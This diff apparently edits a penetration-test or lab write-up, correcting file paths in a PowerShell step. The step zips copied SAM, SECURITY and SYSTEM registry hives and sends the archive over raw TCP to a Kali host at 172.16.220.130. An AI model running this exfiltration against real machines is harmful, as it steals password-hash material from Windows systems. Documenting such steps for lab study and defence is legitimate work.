@@ -54,15 +54,15 @@ Severity: HIGH
 > First, let's use powershell to zip the files and then send the .zip file to Kali:
 
 ```shell
-Compress-Archive -Path "C:\Windows\Users\Sammy\Desktop\SYSTEM-2025-02-11", "C:\Windows\Users\Sammy\Desktop\SECURITY-2025-02-11", "C:\Windows\Users\Sammy\Desktop\SAM-2025-01-15" -DestinationPath "C:\Windows\Users\Sammy\Desktop\hives.zip"
+Compress-Archive -Path "C:\Users\Sammy\Desktop\SYSTEM-2025-02-11", "C:\Users\Sammy\Desktop\SECURITY-2025-02-11", "C:\Users\Sammy\Desktop\SAM-2025-01-15" -DestinationPath "C:\Users\Sammy\Desktop\hives.zip"
 ```
 
 ```powershell
-[System.IO.File]::WriteAllBytes("hives.zip", (Get-Content "C:\Windows\Users\Sammy\Desktop\hives.zip" -Encoding Byte))
+[System.IO.File]::WriteAllBytes("hives.zip", (Get-Content "C:\Users\Sammy\Desktop\hives.zip" -Encoding Byte))
 
 $client = New-Object System.Net.Sockets.TcpClient("172.16.220.130", 80)
 $stream = $client.GetStream()
-$bytes = [System.IO.File]::ReadAllBytes("C:\Windows\Users\Sammy\Desktop\hives.zip")
+$bytes = [System.IO.File]::ReadAllBytes("C:\Users\Sammy\Desktop\hives.zip")
 $stream.Write($bytes, 0, $bytes.Length)
 $stream.Close(); $client.Close()
 ```
